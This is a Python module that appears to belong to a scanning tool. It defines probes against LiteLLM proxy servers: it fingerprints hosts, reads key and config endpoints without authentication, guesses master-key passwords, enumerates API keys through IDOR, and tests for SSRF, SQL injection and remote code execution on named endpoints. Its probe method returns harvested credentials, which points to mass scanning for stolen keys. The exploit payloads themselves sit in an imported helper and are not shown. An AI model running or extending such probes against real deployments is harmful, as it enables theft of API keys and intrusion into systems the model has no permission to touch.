"""LiteLLM prober — key list + config dump + master-key weak auth."""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential

from ..base import Prober
from ..capability import ProbeSpec, RiskLevel, VulnClass
from ._l2l3 import rce_spec, sqli_spec, ssrf_spec

log = logging.getLogger(__name__)

SPECS = [
    ProbeSpec(
        id="litellm.unauth",
        product="litellm",
        vuln_class=VulnClass.UNAUTH_READ,
        risk_level=RiskLevel.L0,
        entry={
            "paths": ["/v1/models", "/health", "/key/list", "/config/list"],
            "tag_prefix": "litellm_unauth",
        },
        max_requests=5,
    ),
    ProbeSpec(
        id="litellm.weak_password",
        product="litellm",
        vuln_class=VulnClass.WEAK_PASSWORD,
        risk_level=RiskLevel.L1,
        entry={
            # master_key as Bearer, then UI login with litellm_ prefix
            "auth_style": "hybrid",
            "bearer_paths": ["/key/list", "/config/list"],
            "login": "/sso/key/generate",
            "body": {"username": "{user}", "password": "{pass}"},
            "password_prefix": "litellm_",
            "token_fields": ["key", "token", "api_key"],
            "post_auth_paths": ["/key/list", "/config/list"],
        },
        max_requests=16,
    ),
    ProbeSpec(
        id="litellm.idor.keys",
        product="litellm",
        vuln_class=VulnClass.IDOR,
        risk_level=RiskLevel.L1,
        requires_auth=True,
        depends_on=("litellm.weak_password",),
        entry={
            "list": "/key/list",
            "object": "/key/info?key={id}",
            "id_enum_max": 5,
            "id_fields": ["token", "key", "key_name", "id"],
            "use_auth": True,
        },
        max_requests=6,
    ),
    ssrf_spec(
        "litellm",
        path="/health/test_connection",
        url_param="api_base",
        body={"model": "gpt-3.5-turbo", "mode": "chat"},
        use_auth=True,
        suffix="ssrf_test_connection",
    ),
    sqli_spec(
        "litellm",
        path="/key/info",
        param="key",
        method="GET",
        use_auth=True,
        suffix="sqli_key_info",
    ),
    rce_spec(
        "litellm",
        path="/utils/dotproduct",
        param="code",
        use_auth=True,
        suffix="rce_utils",
    ),
]


class LiteLLMProber(Prober):
    product_name = "litellm"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "litellm" in blob or "x-litellm" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        return await self.run_specs(hit, SPECS)
